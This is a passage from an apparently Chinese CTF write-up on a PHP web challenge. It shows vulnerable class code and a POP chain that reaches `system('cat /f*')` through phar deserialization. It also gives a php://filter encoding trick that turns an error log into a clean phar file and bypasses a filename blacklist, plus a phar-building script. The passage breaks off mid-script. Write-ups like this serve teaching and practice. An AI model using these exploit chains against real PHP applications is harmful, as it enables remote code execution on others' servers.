&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;请输入文件名&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">getFile&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;lt;textarea class=&amp;#34;file_content&amp;#34; type=&amp;#34;text&amp;#34; value=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">)){&lt;/span> &lt;span style="color:#75715e">// phar无疑 虽然被ban了 加filter绕过(utf-16提示
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;这不合理&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getFile&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// 对filename过滤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;write&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 写入内容 phar
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 读phar 触发反序列化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;该文件不存在或者内容为空&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// 读不存在属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 目标 可rce
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// arg = &amp;#39;cat /f*&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Myerror.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new Files();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error_log&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/html/log/error.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;log_errors&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__tostring&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$test&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">};&lt;/span> &lt;span style="color:#75715e">// Files::__get
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// test = &amp;#39;system&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造pop链时，注意password&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /f*&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $user-&amp;gt;password = [new User(), &amp;#34;check&amp;#34;]; 这样会使$user的两个字段都赋不上值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;check&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:4:&amp;#34;User&amp;#34;:2:{s:8:&amp;#34;username&amp;#34;;O:7:&amp;#34;Myerror&amp;#34;:2:{s:7:&amp;#34;message&amp;#34;;O:5:&amp;#34;Files&amp;#34;:2:{s:8:&amp;#34;filename&amp;#34;;N;s:3:&amp;#34;arg&amp;#34;;s:3:&amp;#34;dir&amp;#34;;}s:4:&amp;#34;test&amp;#34;;s:6:&amp;#34;system&amp;#34;;}s:8:&amp;#34;password&amp;#34;;a:2:{i:0;r:1;i:1;s:5:&amp;#34;check&amp;#34;;}}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经测试可以触发，之后就是如何写phar的问题了&lt;/p>
&lt;p>看代码可以知道没有直接的unserialize点，那大概率是phar，虽然没有上传处 但是Myerror类的构造方法中可以写日志&lt;/p>
&lt;p>&lt;img src="https://i.loli.net/2021/11/28/a5WEKMOeYP8zcHg.png" alt="image.png">&lt;/p>
&lt;p>可以看到日志中有脏数据，我们需要借助过滤器的编码来删去；首先是清空文件内容，可以用&lt;code>php://filter/read=consumed/resource=log/error.txt&lt;/code>&lt;/p>
&lt;p>之后观察日志内容，脏数据+文件内容+脏数据，只用b64肯定不行，我们尝试把除文件之外的其他内容变为b64的非法字符，这样最后b64解码即可&lt;/p>
&lt;p>我们可以先将数据转换为utf-16le的格式，由原先的utf-8转换为utf-16le时，每一位字符后面都会直接添加一个不可见字符&lt;code>\0&lt;/code>，再转回utf-8时，之后后面带&lt;code>\0&lt;/code>的才会被转换 其余的会被当成乱码；这符合我们的要求&lt;/p>
&lt;p>&lt;img src="https://i.loli.net/2021/11/29/pAxRiFMUvS6lmLH.png" alt="image.png">&lt;/p>
&lt;p>题中utf-16le被ban了，我们用ucs-2来代替&lt;/p>
&lt;p>最后要处理的时空字节，&lt;code>file_get_contents&lt;/code>在加载有空字节的文件时会报warning，我们用quoted-printable这种编码，即&lt;code>php://filter/convert.quoted-printable-decode&lt;/code>这种过滤器；它对于所有可打印字符的ascii码（除&lt;code>=&lt;/code>以外）都不变，对于&lt;code>=&lt;/code>和不可打印的ascii码以及非ascii码的数据编码时 会先将每个字节的二进制代码用两个16进制数表示 再在前面加一个等号，比如&lt;code>=&lt;/code>-&amp;gt;&lt;code>=3D&lt;/code>&lt;/p>
&lt;p>我们的编码顺序&lt;/p>
&lt;pre tabindex="0">&lt;code>base64-encode-&amp;gt; utf-8-&amp;gt; ucs-2-&amp;gt; convert.quoted-printable-decode
&lt;/code>&lt;/pre>&lt;p>会被解码的顺序&lt;/p>
&lt;pre tabindex="0">&lt;code>convert.quoted-printable-decode-&amp;gt; ucs-2-&amp;gt; utf-8-&amp;gt; base64-decode
&lt;/code>&lt;/pre>&lt;p>经过这三次编码后就会有纯净的phar文件内容&lt;/p>
&lt;p>最最最后的考点，&lt;code>throw new Error&lt;/code>的存在，我们还需要改&lt;code>i:0&lt;/code>和签名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /f*&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;check&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;phar.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 设置stub，增加gif文件头
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 添加要压缩的文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 将自定义meta-data存入manifest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>改签名和&lt;code>i:0&lt;/code>（略&lt;/p>
&lt;p>编码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;change.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
